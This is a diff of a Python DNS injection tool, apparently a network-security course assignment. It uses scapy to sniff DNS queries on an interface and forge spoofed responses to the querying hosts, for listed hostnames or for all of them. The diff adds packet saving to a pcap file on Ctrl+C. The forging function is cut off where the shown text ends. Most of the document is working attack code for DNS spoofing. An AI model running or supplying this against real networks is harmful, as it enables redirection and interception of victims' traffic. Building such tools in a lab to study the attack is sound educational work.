@@ -13,9 +13,24 @@ If ‘-h‘ is not specified, your injector should forge replies for all observe
 
 # TEST: dig @1.1.1.1 foo1234.example.com
 import argparse
+import signal
+import sys
 import netifaces
 import socket
 from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, Ether, send, wrpcap
+
+def signal_handler(sig, frame):
+    print('You pressed Ctrl+C!')
+    if captured_packets:
+        print("Saving captured packets to file...")
+        wrpcap('injection.pcap', captured_packets)
+        print("Saved captured packets to 'injection.pcap'.")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+captured_packets = []
+
 
 def main():
     parser = argparse.ArgumentParser(description='DNS Injector')
@@ -38,17 +53,19 @@ def main():
         hostnames = {}
         print(">>> No hostnames file provided. All requests will be intercepted.")
 
-    print("##############################################################")
+    print("--------------------------------------------------------------")
     # Start packet capturing and DNS injection
-    capture = sniff(iface=args.interface, filter="udp and port 53", prn=lambda packet: process_packet(packet, args.interface, hostnames))
-    wrpcap('dns.cap', capture)  # Write the captured packets to a file
-    
-        
+
+    try:
+        sniff(iface=args.interface, filter="udp and port 53", prn=lambda packet: process_packet(packet, args.interface, hostnames), store=0)
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 def process_packet(packet, interface, hostnames):
     '''
     Process each intercepted packet, log it, and if necessary, forge a DNS response.
     '''
+    global captured_packets
     if packet.haslayer(DNSQR):  # Check if the packet has a DNS Question Record
         query_name = packet[DNSQR].qname.decode()
         
@@ -58,7 +75,6 @@ def process_packet(packet, interface, hostnames):
         domain = domain[:-1]
 
         # If we want to intercept this domain, generate a fake response
-        
         if str(domain) in list(map(str, hostnames.keys())) or not hostnames:
             if packet.haslayer(Ether):
                 src_mac = packet[Ether].src
@@ -71,16 +87,15 @@ def process_packet(packet, interface, hostnames):
             print(f'DNS Transaction ID: {hex(dns_id)}') # Wireshark: dns.id == 0x1a2b
             print(f'Packet domain: {domain}')  
             #print(f'Packet Summary: {packet.summary()}')
-            # print(f'Packet Details:\n{packet.show()}')  # Uncomment if you want a detailed view of the packet
+            #print(f'Packet Details:\n{packet.show()}')  # Uncomment if you want a detailed view of the packet
             if packet.haslayer(IP):
                 print(">>> Sending fake response to: {}".format(packet[IP].src))
+                captured_packets.append(packet)
                 send_fake_response(packet, interface, hostnames)
             print("##############################################################")
 
 
 def send_fake_response(packet, interface, hostnames):
-    #local_ip = socket.gethostbyname(socket.gethostname())
-    #ip = hostnames.get(packet[DNSQR].qname.decode("utf-8"), local_ip)
     domain = packet[DNSQR].qname.decode("utf-8").rstrip('.')
     print(">>> Domain: {}".format(domain))
     if hostnames:
